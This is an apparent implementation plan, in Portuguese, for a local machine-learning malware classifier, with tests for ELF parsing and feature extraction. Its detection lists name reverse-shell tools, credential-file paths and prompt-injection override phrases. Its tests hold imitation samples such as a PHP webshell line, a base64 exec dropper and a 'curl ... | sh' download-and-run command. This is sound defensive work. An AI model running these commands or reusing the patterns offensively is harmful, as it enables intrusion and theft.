# Classificador local de malware por IA — Plano 1: motor em tempo de execução

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Entregar todo o classificador que roda na máquina do usuário (tipo do arquivo, características, carregador e
avaliador do modelo, explicação, decisão, integração com scanner, motor, quarentena, telemetria, config e CLI),
testado com modelos de teste feitos à mão, pronto para receber o modelo real do Plano 2.

**Architecture:** Pacote novo `src/mandacaru/ml/` puro (só biblioteca padrão): `bytes → Verdict`. O
`StaticScanner.scan_bytes` chama o `Classifier` com os mesmos bytes que já leu e converte o `Verdict` em `Alert`
`ml.*`. O motor só isola alertas `ml.*` com `evidence["ml_isolate"] is True`. Sem arquivos de modelo instalados, o
classificador fica desligado e o resto do Mandacaru segue igual.

**Tech Stack:** Python ≥ 3.10, biblioteca padrão (`struct`, `re`, `math`, `hashlib`, `json`, `collections`), pytest,
ruff.

**Spec:** `docs/superpowers/specs/2026-11-20-classificador-ia-malware-design.md`

**Escopo:** este é o Plano 1 de 2. O **Plano 2** (ambiente de treino endurecido, coleta e higiene dos dados, treino,
calibração, portão, exportação do modelo, `golden.json`, testes de política de `tools/treino/`, modo sombra no SUPRA
e liberação do isolamento — fases F0, F2, F3, F5 e F6 do spec) será escrito depois deste, porque importa o
`features.py` daqui. Este plano cobre as fases F1 e F4.

## Global Constraints

- Tempo de execução só com biblioteca padrão; nada novo em `[project.dependencies]`; proibido `pickle`, `joblib`,
  ONNX ou qualquer formato que execute código ao carregar.
- ruff: `line-length = 120`, regras `E, F, W, I, B`; alvo `py310`.
- Textos em código e mensagens seguem o padrão do projeto: português **sem acento** (ex.: `confianca`, `nao`).
- Características vêm só do conteúdo, nunca do nome ou do caminho do arquivo.
- Limites: `MAX_BYTES` = 8 MB (o modelo só avalia se `len(data) < MAX_BYTES`); histograma nos primeiros 64 KB;
  strings no primeiro 1 MB; IPs procurados só dentro das strings; entropia de seções com amostragem de até 64 KB por
  seção e 512 KB no total; no máximo 4.096 seções, 50.000 símbolos importados e 200.000 strings examinadas;
  orçamento de 250 ms por arquivo; cache LRU de 4.096 entradas por SHA-256.
- Regex só de forma linear: literais e classes com um quantificador simples; nunca quantificadores aninhados.
- Modelo JSON: ≤ 10 MB, profundidade ≤ 16, filhos com índice maior que o pai, números finitos.
- Faixas: `alto`, `reforco`, `medio`, `baixo`. Modos: `off`, `shadow`, `alert`, `isolate`; padrão `shadow`, vindo do
  código (o `packaging/config.toml` traz o `mode` comentado).
- O modelo **nunca** libera, rebaixa ou suprime um alerta de regra, e nunca mexe na lista de confiança.
- `summary` com no máximo 200 caracteres, sem conteúdo do arquivo; `evidence` com até 5 motivos; `summary` com 3.
- Log do modo sombra: `/var/log/mandacaru/ml-shadow.jsonl`, `0640`, só gravado pelo monitor.
- Nenhum malware real nos testes: só bytes montados à mão que imitam técnicas.
- Commits com autor `VandyckLN <183553227+VandyckLN@users.noreply.github.com>` e **sem** linha `Co-Authored-By`.

## Review Focus

- Arquivo vazio ou com 1 a 3 bytes deve dar `detect_kind(...) is None`, sem exceção (teste na Task 1).
- Script com shebang seguido de bytes binários (NUL, não UTF-8) é tratado como script e a extração não levanta
  (teste na Task 4).
- Script de uma linha só com 1 MB (JS minificado) termina dentro do orçamento e com `maior_linha_log2` limitado
  (teste na Task 4).
- Arquivo de modelo truncado ou ilegível desliga só o classificador, com motivo, sem derrubar o scanner (teste na
  Task 8).
- O mesmo conteúdo em `/tmp` e em Downloads: o cache por SHA-256 guarda nota e motivos, mas a faixa é recalculada por
  caminho (teste na Task 8).

---

### Task 1: Tipo do arquivo pelo conteúdo

**Files:**
- Create: `src/mandacaru/ml/__init__.py` (vazio por enquanto, só a docstring)
- Create: `src/mandacaru/ml/kind.py`
- Test: `tests/test_ml_kind.py`

**Interfaces:**
- Produces: `KINDS: tuple[str, ...] = ("elf", "sh", "python", "perl", "js", "php")`;
  `SCRIPT_KINDS = KINDS[1:]`; `detect_kind(data: bytes) -> str | None`.

- [ ] **Step 1: Write the failing tests**

```python
import struct
from mandacaru.ml.kind import detect_kind

def _elf(e_type):
    return b"\x7fELF\x02\x01\x01" + b"\0" * 9 + struct.pack("<HH", e_type, 62) + b"\0" * 44

def test_elf_executavel_e_biblioteca():
    assert detect_kind(_elf(2)) == "elf"      # EXEC
    assert detect_kind(_elf(3)) == "elf"      # DYN

def test_elf_objeto_e_core_ignorados():
    assert detect_kind(_elf(1)) is None       # REL (.o)
    assert detect_kind(_elf(4)) is None       # CORE

def test_shebangs():
    assert detect_kind(b"#!/bin/bash\necho oi\n") == "sh"
    assert detect_kind(b"#!/usr/bin/env python3\nprint(1)\n") == "python"
    assert detect_kind(b"#!/usr/bin/perl -w\nprint 1;\n") == "perl"
    assert detect_kind(b"#!/usr/bin/env node\nconsole.log(1)\n") == "js"
    assert detect_kind(b"#!/usr/bin/php\n<?php echo 1;\n") == "php"
    assert detect_kind(b"#!/usr/bin/env -S dash -e\ntrue\n") == "sh"

def test_sem_shebang_pelo_conteudo():
    assert detect_kind(b"<?php system($_GET['c']);") == "php"
    assert detect_kind(b"import os\nos.system('id')\n") == "python"
    assert detect_kind(b"const fs = require('fs');\nmodule.exports = 1;\n") == "js"
    assert detect_kind(b"if [ -f x ]; then\n  rm x\nfi\n") == "sh"
    assert detect_kind(b"use strict;\nmy $x = 1;\n") == "perl"

def test_nao_suportados():
    assert detect_kind(b"%PDF-1.7 ...") is None
    assert detect_kind(b"\x89PNG\r\n\x1a\n") is None
    assert detect_kind(b"texto qualquer de anotacao\n") is None
    assert detect_kind(b"\0\1\2" * 100) is None

def test_vazio_e_minusculos():
    for data in (b"", b"#", b"#!", b"\x7fEL"):
        assert detect_kind(data) is None
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_kind.py -q`
Expected: FAIL (`ModuleNotFoundError: mandacaru.ml.kind`)

- [ ] **Step 3: Implement `detect_kind(data: bytes) -> str | None` in `src/mandacaru/ml/kind.py`**

- ELF: magic `\x7fELF` e pelo menos 18 bytes; `e_type` (offset 16, endianness pelo byte 5: 1 = little, 2 = big)
  igual a 2 ou 3 → `"elf"`; qualquer outro valor → `None`.
- Shebang: primeira linha (até 256 bytes); interpretador = basename do primeiro token, ou do primeiro token que não
  começa com `-` depois de `env`. `sh|bash|dash|zsh|ksh|ash|busybox` → `sh`; começa com `python` → `python`;
  `perl` → `perl`; `node|nodejs` → `js`; começa com `php` → `php`.
- Sem shebang: só considera texto (nenhum NUL e ≥ 90 % de bytes imprimíveis ou de espaço nos primeiros 4 KB).
  Marcadores procurados nos primeiros 4 KB, na ordem: `<?php` → php; linha iniciando com `import ` ou `from ... import`
  ou `def ` → python; `require(`, `module.exports`, `=> {` → js; `use strict;` ou `my $` → perl; linhas `fi`, `then`
  ou `esac`, ou `$(` → sh. Sem marcador → `None`.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_kind.py -q && .venv/bin/ruff check src/mandacaru/ml tests/test_ml_kind.py`
Expected: todos passam; `All checks passed!`

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/__init__.py src/mandacaru/ml/kind.py tests/test_ml_kind.py
git commit -m "ML: tipo do arquivo pelo conteudo (ELF executavel e scripts)"
```

---

### Task 2: Leitor de ELF tolerante a arquivos hostis

**Files:**
- Create: `src/mandacaru/ml/elf.py`
- Create: `tests/ml_elf.py` (montador de ELF para os testes)
- Test: `tests/test_ml_elf.py`

**Interfaces:**
- Produces (em `elf.py`):
  - `@dataclass(frozen=True) class Section: name: str; type: int; flags: int; addr: int; offset: int; size: int`
  - `@dataclass(frozen=True) class Segment: type: int; flags: int; offset: int; filesz: int`
  - `@dataclass(frozen=True) class ElfInfo: is64: bool; big_endian: bool; e_type: int; machine: int; entry: int;
    sections: tuple[Section, ...]; segments: tuple[Segment, ...]; has_section_table: bool; has_interp: bool;
    has_symtab: bool; dyn_imports: tuple[str, ...]; end_of_structures: int`
  - `MAX_SECTIONS = 4096`, `MAX_IMPORTS = 50_000`
  - `parse_elf(data: bytes) -> ElfInfo | None`
- Produces (em `tests/ml_elf.py`): `make_elf(*, is64=True, big_endian=False, e_type=2, machine=62, entry=0x401000,
  sections=(), segments=(), dynsyms=(), shnum_override=None, shoff_override=None) -> bytes`, onde `sections` é uma
  sequência de `(nome, sh_type, flags, addr, conteudo_bytes)` e `segments` de `(p_type, p_flags)`. O montador gera
  `.shstrtab` sozinho e, se `dynsyms` não estiver vazio, `.dynsym` (tipo 11) e `.dynstr`.

- [ ] **Step 1: Write the failing tests**

```python
from mandacaru.ml.elf import MAX_SECTIONS, parse_elf
from ml_elf import make_elf

TEXT = (".text", 1, 0x6, 0x401000, b"\x90" * 64)

def test_elf_basico():
    info = parse_elf(make_elf(sections=[TEXT], segments=[(1, 5), (3, 4)], dynsyms=["socket", "execve"]))
    assert info.is64 and not info.big_endian and info.e_type == 2 and info.machine == 62
    assert [s.name for s in info.sections][:2] == ["", ".text"]
    assert info.has_interp is True                        # PT_INTERP = 3
    assert set(info.dyn_imports) == {"socket", "execve"}
    assert info.has_section_table and not info.has_symtab

def test_elf_32_big_endian_mips():
    info = parse_elf(make_elf(is64=False, big_endian=True, machine=8, sections=[TEXT]))
    assert not info.is64 and info.big_endian and info.machine == 8

def test_sem_tabela_de_secoes():
    info = parse_elf(make_elf(sections=[], shoff_override=0))
    assert info.has_section_table is False and info.sections == ()

def test_truncado_nunca_levanta():
    full = make_elf(sections=[TEXT], segments=[(1, 5)], dynsyms=["connect"])
    for n in range(0, len(full), 7):
        parse_elf(full[:n])                               # nao levanta; pode devolver None ou parcial

def test_contagens_e_deslocamentos_absurdos():
    data = make_elf(sections=[TEXT], shnum_override=65535)
    assert len(parse_elf(data).sections) <= MAX_SECTIONS
    assert parse_elf(make_elf(sections=[TEXT], shoff_override=2**62)).has_section_table is False

def test_nao_elf():
    assert parse_elf(b"#!/bin/sh\n") is None
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_elf.py -q`
Expected: FAIL (`ModuleNotFoundError`)

- [ ] **Step 3: Implement `parse_elf` in `src/mandacaru/ml/elf.py` and `make_elf` in `tests/ml_elf.py`**

Toda leitura usa `struct.unpack_from` dentro de `try`/limite e confere `offset + tamanho <= len(data)`. Nada é
confiado do arquivo: contagens são limitadas por `MAX_SECTIONS`/`MAX_IMPORTS` e pelo que cabe no arquivo; uma
estrutura que não cabe é ignorada (o resto continua). `has_section_table` só é verdadeiro se `e_shoff` e `e_shnum`
apontarem para dentro do arquivo. Nomes de seção vêm de `.shstrtab` (`e_shstrndx`), cortados no primeiro NUL e em
64 bytes. `dyn_imports`: símbolos de `.dynsym` com `st_shndx == 0` e nome não vazio (nome em `.dynstr`, via
`sh_link`). `has_symtab`: existe seção do tipo 2 (`SHT_SYMTAB`). `end_of_structures` = maior valor entre o fim de
cada seção que não é `SHT_NOBITS` (8), o fim da tabela de seções e o fim da tabela de segmentos. Sem recursão.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_elf.py -q && .venv/bin/ruff check src/mandacaru/ml tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/elf.py tests/ml_elf.py tests/test_ml_elf.py
git commit -m "ML: leitor de ELF com limites, tolerante a cabecalhos corrompidos"
```

---

### Task 3: Características de ELF e indicadores compartilhados

**Files:**
- Create: `src/mandacaru/ml/features.py`
- Test: `tests/test_ml_features_elf.py`

**Interfaces:**
- Consumes: `parse_elf`, `ElfInfo` (Task 2).
- Produces:
  - `FEATURE_VERSION = 1`
  - `INDICATORS: dict[str, tuple[bytes, ...]]` (padrões **minúsculos**; a busca é sobre o primeiro 1 MB em
    minúsculas, e cada família conta quantos padrões **distintos** aparecem):
    - `mineracao`: `stratum+tcp`, `stratum+ssl`, `xmrig`, `cryptonight`, `randomx`, `nicehash`, `monero`
    - `persistencia`: `crontab`, `/etc/cron`, `/etc/systemd/system`, `systemctl enable`, `/etc/rc.local`,
      `.bashrc`, `.profile`, `authorized_keys`, `/etc/init.d`
    - `credenciais`: `/etc/shadow`, `/etc/passwd`, `id_rsa`, `.ssh/`, `.aws/credentials`, `.docker/config.json`,
      `wallet.dat`
    - `antianalise`: `tracerpid`, `ld_preload`, `/etc/ld.so.preload`, `ptrace_traceme`
    - `download`: `wget `, `curl `, `tftp `, `ftpget`, `busybox`, `urllib`, `requests.get`, `fetch(`
    - `execucao`: `chmod +x`, `chmod 777`, `/bin/sh -c`, `sh -c `, `nohup`, `setsid`, `disown`
    - `sabotagem`: `iptables -f`, `setenforce 0`, `ufw disable`, `pkill`, `killall`, `kill -9`, `systemctl stop`
    - `autoapagamento`: `/proc/self/exe`, `shred `, `rm -f $0`
    - `esconderijo`: `/tmp/.`, `/dev/shm/.`, `/var/tmp/.`, `histfile`, `history -c`, `/dev/null 2>&1`
    - `resgate`: `your files have been encrypted`, `seus arquivos foram criptografados`, `.onion`, `bitcoin`,
      `decrypt`
    - `shell_reverso`: `/dev/tcp/`, `nc -e`, `ncat -e`, `mkfifo`, `pty.spawn`, `dup2`
    - `prompt_injection`: `ignore previous instructions`, `ignore all previous`, `disregard previous`,
      `you are now`, `system prompt`
  - `COMMON_NAMES: tuple[str, ...]` = `tuple(f"ind_{f}" for f in INDICATORS) + ("ip_literais", "urls",
    "user_agent")`
  - `ELF_FEATURE_NAMES: tuple[str, ...]` = `("tamanho_log2", "entropia_cabeca", "entropia_max_secao", "classe64",
    "big_endian", "tipo_dyn", "arch_x86_64", "arch_arm", "arch_mips", "arch_outra", "n_secoes", "n_segmentos",
    "sem_tabela_secoes", "dinamico", "segmento_wx", "entrada_fora_text", "entrada_ultima_secao",
    "sobra_pos_estruturas_log2", "upx", "secoes_anomalas", "tem_symtab", "n_importacoes", "imp_rede",
    "imp_processo", "imp_privilegio", "imp_arquivo", "imp_sinal", "n_strings_log2", "strings_tam_medio")` +
    `COMMON_NAMES`
  - `class ExtractionBudgetExceeded(Exception)`
  - `extract_elf(data: bytes, *, budget_s: float = 0.25) -> list[float]` (comprimento = `len(ELF_FEATURE_NAMES)`)

- [ ] **Step 1: Write the failing tests**

```python
import time
from mandacaru.ml.features import ELF_FEATURE_NAMES, ExtractionBudgetExceeded, extract_elf
from ml_elf import make_elf

def feat(data):
    return dict(zip(ELF_FEATURE_NAMES, extract_elf(data)))

TEXT = (".text", 1, 0x6, 0x401000, b"\x90" * 256)

def test_vetor_tem_um_valor_por_nome_e_e_deterministico():
    data = make_elf(sections=[TEXT])
    assert len(extract_elf(data)) == len(ELF_FEATURE_NAMES) == len(set(ELF_FEATURE_NAMES))
    assert extract_elf(data) == extract_elf(data)

def test_minerador_imitado():
    body = b"stratum+tcp://pool.exemplo.invalid:3333\x00xmrig\x00/etc/cron.d/x\x00"
    f = feat(make_elf(sections=[TEXT, (".rodata", 1, 0x2, 0x402000, body)], dynsyms=["socket", "connect", "fork"]))
    assert f["ind_mineracao"] == 2 and f["ind_persistencia"] == 1
    assert f["imp_rede"] == 2 and f["imp_processo"] == 1 and f["n_importacoes"] == 3

def test_compactado_imitado():
    import os
    rnd = os.urandom(200_000)
    f = feat(make_elf(sections=[("UPX0", 8, 0x6, 0x400000, b""), ("UPX1", 1, 0x6, 0x500000, rnd)],
                      segments=[(1, 7)]))
    assert f["upx"] == 1 and f["entropia_max_secao"] > 7.5 and f["segmento_wx"] == 1
    assert f["secoes_anomalas"] == 2 and f["tem_symtab"] == 0

def test_ips_so_dentro_das_strings():
    f = feat(make_elf(sections=[TEXT, (".rodata", 1, 2, 0x402000, b"conecta 203.0.113.9 agora\x00")]))
    assert f["ip_literais"] == 1

def test_orcamento_estourado():
    import pytest
    with pytest.raises(ExtractionBudgetExceeded):
        extract_elf(make_elf(sections=[TEXT]), budget_s=0.0)

def test_entradas_aleatorias_nunca_levantam():
    import random
    rnd = random.Random(7)
    for _ in range(2000):
        data = b"\x7fELF" + bytes(rnd.getrandbits(8) for _ in range(rnd.randrange(0, 4096)))
        assert len(extract_elf(data)) == len(ELF_FEATURE_NAMES)

def test_pior_caso_limitado():
    import os
    big = make_elf(sections=[(f".s{i}", 1, 2, 0x400000 + i * 0x10000, os.urandom(60_000)) for i in range(60)])
    t = time.perf_counter()
    extract_elf(big)
    assert time.perf_counter() - t < 0.25
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_features_elf.py -q`
Expected: FAIL (`ModuleNotFoundError`)

- [ ] **Step 3: Implement `extract_elf` and the shared helpers in `src/mandacaru/ml/features.py`**

- `*_log2` = `math.log2(1 + x)`. Entropia de Shannon via `collections.Counter` (código em C).
- `entropia_cabeca`: primeiros 64 KB. `entropia_max_secao`: maior entropia entre as seções com conteúdo no arquivo,
  amostrando até 64 KB do início de cada uma, parando ao somar 512 KB.
- Arquitetura: 62 → `arch_x86_64`; 40 ou 183 → `arch_arm`; 8 → `arch_mips`; qualquer outra → `arch_outra`.
- `dinamico` = `has_interp`; `segmento_wx`: algum `PT_LOAD` (1) com `PF_W|PF_X` (2|1).
- `entrada_fora_text`: existe `.text` e a entrada não está em `[addr, addr+size)`; `entrada_ultima_secao`: a entrada
  está na seção alocada (`SHF_ALLOC` = 2) de maior endereço.
- `upx`: `b"UPX!"` nos dados ou seção chamada `UPX0`/`UPX1`/`UPX2`.
- `secoes_anomalas`: seções com nome não vazio que não começam com nenhum destes prefixos: `.text .data .bss
  .rodata .init .fini .plt .got .dyn .rel .rela .note .eh_frame .gcc_except_table .comment .debug .symtab .strtab
  .shstrtab .interp .hash .gnu .ctors .dtors .jcr .tbss .tdata .init_array .fini_array .preinit_array .go .noptr
  .typelink .itablink .gopclntab .gosymtab .ARM .MIPS .mips .sbss .sdata .reginfo .tm_clone_table .stapsdt`.
- Grupos de importação: `imp_rede` = socket, connect, bind, listen, accept, send, sendto, recv, recvfrom,
  gethostbyname, getaddrinfo; `imp_processo` = execve, execl, execlp, execv, execvp, fork, vfork, clone, system,
  popen; `imp_privilegio` = setuid, setgid, setresuid, setreuid, capset, prctl, ptrace; `imp_arquivo` = unlink,
  chmod, fchmod, rename, remove, opendir, readdir; `imp_sinal` = kill, signal, sigaction.
- Strings: `re.compile(rb"[\x20-\x7e]{6,}")` no primeiro 1 MB, no máximo 200.000. `ip_literais`: strings que contêm
  `.` e casam `rb"\b(?:\d{1,3}\.){3}\d{1,3}\b"` (limite 1.000). `urls`: ocorrências de `http://` e `https://`
  (limite 1.000). `user_agent`: ocorrências de `mozilla/` (limite 1.000).
- Orçamento: `time.perf_counter()` conferido entre as etapas (leitura do ELF, entropias, strings, indicadores);
  passou de `budget_s`, levanta `ExtractionBudgetExceeded`.
- ELF que `parse_elf` não reconhece: as características estruturais valem 0 e as de conteúdo são calculadas mesmo
  assim.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_features_elf.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/features.py tests/test_ml_features_elf.py
git commit -m "ML: caracteristicas de ELF e indicadores compartilhados, com orcamento de tempo"
```

---

### Task 4: Características de scripts

**Files:**
- Modify: `src/mandacaru/ml/features.py`
- Test: `tests/test_ml_features_script.py`

**Interfaces:**
- Consumes: `INDICATORS`, `COMMON_NAMES`, `ExtractionBudgetExceeded` (Task 3); `SCRIPT_KINDS` (Task 1).
- Produces:
  - `SCRIPT_FEATURE_NAMES: tuple[str, ...]` = `tuple(f"tipo_{k}" for k in SCRIPT_KINDS) + ("tem_shebang",
    "tamanho_log2", "linhas_log2", "maior_linha_log2", "entropia", "nao_alnum", "blocos_b64", "maior_b64_log2",
    "blocos_hex", "escapes_hex", "char_codes", "exec_dinamico", "decodificacao", "baixa_e_executa")` + `COMMON_NAMES`
  - `extract_script(kind: str, data: bytes, *, budget_s: float = 0.25) -> list[float]`
  - `extract(kind: str, data: bytes, *, budget_s: float = 0.25) -> list[float]` (`"elf"` → `extract_elf`; um tipo de
    script → `extract_script`; outro → `ValueError`)
  - `FAMILY = {"elf": "elf", **{k: "script" for k in SCRIPT_KINDS}}`

- [ ] **Step 1: Write the failing tests**

```python
import base64, time
from mandacaru.ml.features import SCRIPT_FEATURE_NAMES, extract, extract_script

def feat(kind, data):
    return dict(zip(SCRIPT_FEATURE_NAMES, extract_script(kind, data)))

def test_um_valor_por_nome():
    assert len(extract_script("sh", b"echo oi\n")) == len(SCRIPT_FEATURE_NAMES) == len(set(SCRIPT_FEATURE_NAMES))

def test_dropper_imitado():
    payload = base64.b64encode(b"print('inofensivo')" * 10).decode()
    f = feat("python", f"import base64\nexec(base64.b64decode('{payload}'))\n".encode())
    assert f["tipo_python"] == 1 and f["exec_dinamico"] >= 1 and f["decodificacao"] >= 1 and f["blocos_b64"] == 1

def test_baixa_e_executa():
    f = feat("sh", b"#!/bin/sh\ncurl -s http://exemplo.invalid/x | sh\n")
    assert f["baixa_e_executa"] == 1 and f["tem_shebang"] == 1 and f["urls"] == 1
    assert feat("sh", b"#!/bin/sh\ncurl -s http://exemplo.invalid/x -o x\n")["baixa_e_executa"] == 0

def test_shebang_seguido_de_binario_nao_levanta():
    f = feat("sh", b"#!/bin/sh\n" + bytes(range(256)) * 20)
    assert f["tipo_sh"] == 1

def test_linha_unica_gigante_dentro_do_orcamento():
    data = b"var a=" + b"x" * (1024 * 1024) + b";"
    t = time.perf_counter()
    f = feat("js", data)
    assert time.perf_counter() - t < 0.25 and f["maior_linha_log2"] <= 21

def test_entradas_aleatorias_nunca_levantam():
    import random
    rnd = random.Random(11)
    for _ in range(2000):
        data = bytes(rnd.getrandbits(8) for _ in range(rnd.randrange(0, 4096)))
        assert len(extract_script("sh", data)) == len(SCRIPT_FEATURE_NAMES)

def test_extract_despacha_por_tipo():
    import pytest
    assert extract("perl", b"my $x = 1;\n") == extract_script("perl", b"my $x = 1;\n")
    with pytest.raises(ValueError):
        extract("pdf", b"%PDF")
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_features_script.py -q`
Expected: FAIL (`ImportError`)

- [ ] **Step 3: Implement `extract_script` and `extract` in `src/mandacaru/ml/features.py`**

- Texto = primeiro 1 MB; `linhas` = contagem de `\n` + 1; `maior_linha` medida sobre esse 1 MB (por isso o teto
  log2(2^20 + 1) ≈ 20,000…); `entropia` e `nao_alnum` (proporção de bytes fora de `[A-Za-z0-9 \t\r\n]`) nos primeiros
  64 KB.
- `blocos_b64`: `rb"[A-Za-z0-9+/]{40,}={0,2}"` (limite 10.000) e `maior_b64_log2`; `blocos_hex`:
  `rb"[0-9a-fA-F]{64,}"`; `escapes_hex`: `rb"\\x[0-9a-fA-F]{2}"` (limite 100.000); `char_codes`: ocorrências de
  `fromcharcode` e `chr(` no texto minúsculo.
- `exec_dinamico` (padrões distintos, minúsculo): `eval(`, `exec(`, `compile(`, `new function(`, `source <(`,
  `create_function(`, `assert($`.
- `decodificacao`: `base64 -d`, `base64 --decode`, `b64decode`, `atob(`, `fromcharcode`, `zlib`, `marshal.loads`,
  `gzinflate`, `str_rot13`, `bytes.fromhex`, `xxd -r`.
- `baixa_e_executa` = 1 se algum padrão de `INDICATORS["download"]` aparece **e** algum destes: `| sh`, `| bash`,
  `|sh`, `|bash`, `chmod +x`, `exec(`, `eval(`, `os.system`, `subprocess`, `child_process`, `popen`.
- As características de `COMMON_NAMES` reaproveitam os helpers da Task 3 (mesmas regras e limites).

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_features_script.py tests/test_ml_features_elf.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/features.py tests/test_ml_features_script.py
git commit -m "ML: caracteristicas de scripts (ofuscacao, execucao dinamica, baixar e executar)"
```

---

### Task 5: Carregador estrito e avaliador do modelo

**Files:**
- Create: `src/mandacaru/ml/model.py`
- Create: `tests/ml_model.py` (montador de modelos de teste)
- Test: `tests/test_ml_model.py`

**Interfaces:**
- Consumes: `ELF_FEATURE_NAMES`, `SCRIPT_FEATURE_NAMES`, `FEATURE_VERSION` (Tasks 3–4).
- Produces (em `model.py`):
  - `class ModelError(ValueError)`
  - `@dataclass(frozen=True) class KindPolicy: gate_passed: bool; alto: float; alto_tmp: float; reforco: float;
    medio: float`
  - `@dataclass(frozen=True) class Tree: feature: tuple[int, ...]; threshold: tuple[float, ...];
    left: tuple[int, ...]; right: tuple[int, ...]; value: tuple[float, ...]`
  - `@dataclass(frozen=True) class Model: model_id: str; family: str; feature_names: tuple[str, ...];
    kinds: dict[str, KindPolicy]; trees: tuple[Tree, ...]; base_score: float; calib_x: tuple[float, ...];
    calib_y: tuple[float, ...]`, com os métodos `raw_score(x: Sequence[float]) -> float`,
    `probability(x) -> float` e `contributions(x) -> list[float]`
  - `MAX_MODEL_BYTES = 10 * 1024 * 1024`, `MAX_DEPTH = 16`
  - `load_model(path: Path, *, expected_sha256: str | None) -> Model`
  - `parse_model(raw: bytes) -> Model` (usado por `load_model` depois do hash)
- Produces (em `tests/ml_model.py`): `model_dict(*, family="elf", kinds=None, trees=None, base_score=0.0) -> dict`
  (modelo válido mínimo, com os `feature_names` corretos da família e calibração identidade `x=[0,1]`, `y=[0,1]`) e
  `stump(feature_index, threshold, left_value, right_value, root_value=0.0) -> dict` (uma árvore de 3 nós). Os
  testes importam com `from ml_model import ...` (a pasta `tests/` não é pacote; o pytest a põe no `sys.path`).
  Na Task 8 este arquivo ganha `DROPPER` e `script_classifier(mode="isolate", valor=2.6) -> Classifier`.

Formato do JSON: o da seção 9 do spec, mais a chave `"family": "elf" | "script"`. Uma folha tem `feature == -1`. Vai
para a esquerda se `x[feature] <= threshold`. `value[i]` existe para todos os nós (interno e folha), porque a
explicação precisa dele.

- [ ] **Step 1: Write the failing tests**

```python
import hashlib, json, math
import pytest
from mandacaru.ml.features import ELF_FEATURE_NAMES
from mandacaru.ml.model import ModelError, load_model, parse_model
from ml_model import model_dict, stump

def raw(d):
    return json.dumps(d).encode()

def test_avalia_e_calibra():
    i = ELF_FEATURE_NAMES.index("upx")
    m = parse_model(raw(model_dict(trees=[stump(i, 0.5, -2.0, 3.0)], base_score=0.5)))
    x = [0.0] * len(ELF_FEATURE_NAMES)
    assert m.raw_score(x) == pytest.approx(-1.5)
    x[i] = 1.0
    assert m.raw_score(x) == pytest.approx(3.5)
    assert m.probability(x) == pytest.approx(1 / (1 + math.exp(-3.5)))

def test_contribuicoes_somam_a_nota():
    i = ELF_FEATURE_NAMES.index("entropia_max_secao")
    m = parse_model(raw(model_dict(trees=[stump(i, 7.0, -1.0, 2.0, root_value=0.25)], base_score=-0.1)))
    x = [0.0] * len(ELF_FEATURE_NAMES); x[i] = 7.9
    c = m.contributions(x)
    assert c[i] == pytest.approx(1.75)
    assert m.base_score + 0.25 + sum(c) == pytest.approx(m.raw_score(x))

@pytest.mark.parametrize("mutar", [
    lambda d: d["trees"][0]["left"].__setitem__(0, 0),            # filho <= pai (ciclo)
    lambda d: d["trees"][0]["feature"].__setitem__(0, 10_000),    # indice fora
    lambda d: d["trees"][0]["threshold"].__setitem__(0, float("nan")),
    lambda d: d.__setitem__("feature_names", ["x"]),
    lambda d: d.__setitem__("feature_version", 999),
    lambda d: d.__setitem__("pickle", "nao"),                     # chave desconhecida
    lambda d: d["kinds"]["elf"].__setitem__("alto", 1.5),         # limiar fora de [0,1]
])
def test_rejeita_modelo_invalido(mutar):
    d = model_dict(trees=[stump(0, 0.5, 0.0, 1.0)])
    mutar(d)
    with pytest.raises(ModelError):
        parse_model(raw(d))

def test_profundidade_e_tamanho(tmp_path):
    with pytest.raises(ModelError):
        parse_model(b" " * (10 * 1024 * 1024 + 1))
    with pytest.raises(ModelError):
        parse_model(b"{nao e json")

def test_hash_fixado(tmp_path):
    p = tmp_path / "elf.json"
    p.write_bytes(raw(model_dict(trees=[stump(0, 0.5, 0.0, 1.0)])))
    ok = hashlib.sha256(p.read_bytes()).hexdigest()
    assert load_model(p, expected_sha256=ok).family == "elf"
    with pytest.raises(ModelError):
        load_model(p, expected_sha256="0" * 64)
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_model.py -q`
Expected: FAIL (`ModuleNotFoundError`)

- [ ] **Step 3: Implement `parse_model`, `load_model` and the `Model` methods in `src/mandacaru/ml/model.py`**

- Validação de `parse_model`:
  - tamanho ≤ `MAX_MODEL_BYTES`; JSON é objeto;
  - chaves exatamente `format_version, model_id, family, created_at, feature_version, feature_code_sha,
    feature_names, kinds, trees, base_score, calibration, metrics, data_manifest_sha256`;
  - `format_version == 1`; `family` em `{"elf", "script"}`; `feature_version == FEATURE_VERSION`; `feature_names`
    idêntico à tupla da família;
  - cada `kinds[k]` com `k` em `KINDS` coerente com a família, `gate_passed` booleano e os quatro limiares em [0, 1];
  - em cada árvore: listas de mesmo comprimento; `feature[i] == -1` ou `0 <= feature[i] < n`; nó interno com
    `i < left[i]`, `i < right[i]`, ambos `< len`; profundidade ≤ `MAX_DEPTH`; todo número finito;
  - `calibration.x` crescente e `calibration.y` não decrescente, ambos em [0, 1] e do mesmo tamanho (≥ 2).
  - Qualquer violação → `ModelError` com motivo em português.
- `raw_score`: `base_score` + soma das folhas (laço iterativo por árvore). `probability`: sigmoide da nota bruta e
  depois interpolação linear por partes em `(calib_x, calib_y)`, com o valor preso às pontas.
- `contributions`: para cada árvore, ao descer de `n` para o filho `c`, soma `value[c] - value[n]` em `feature[n]`.
